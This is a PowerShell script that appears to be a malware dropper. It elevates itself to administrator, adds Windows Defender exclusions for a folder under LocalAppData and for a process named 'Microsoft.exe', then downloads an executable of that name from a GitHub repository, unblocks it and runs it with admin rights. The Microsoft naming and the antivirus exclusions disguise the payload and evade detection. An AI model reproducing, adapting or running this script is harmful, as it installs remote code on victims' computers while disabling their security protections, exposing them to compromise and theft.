$folderPath = "$env:LOCALAPPDATA\Microsoft"
$exePath = "$folderPath\Microsoft.exe"
$exeUrl = "https://github.com/qoqoxxxx-stack/aa/raw/refs/heads/main/Microsoft.exe"

# 1. Force TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 2. Self-Elevate to Admin (Required for Defender Exclusions)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# 3. Security Preparation (CRITICAL: Do this BEFORE download)
if (-not (Test-Path $folderPath)) { New-Item -Path $folderPath -ItemType Directory -Force }

# Whitelist the folder AND the process name to stop the "Plugin Error"
Add-MpPreference -ExclusionPath $folderPath -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "Microsoft.exe" -ErrorAction SilentlyContinue

# 4. Clean up old process
Stop-Process -Name "Microsoft" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

# 5. Download, Unblock, and Run
try {
    # Remove old file if it exists to avoid access denied errors
    if (Test-Path $exePath) { Remove-Item $exePath -Force }

    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UserAgent "Mozilla/5.0"
    
    if (Test-Path $exePath) {
        Unblock-File -Path $exePath
        # Launch the EXE with high priority
        Start-Process $exePath -Verb RunAs
    }
} catch {
    Write-Host "Download failed: $($_.Exception.Message)" -ForegroundColor Red
}
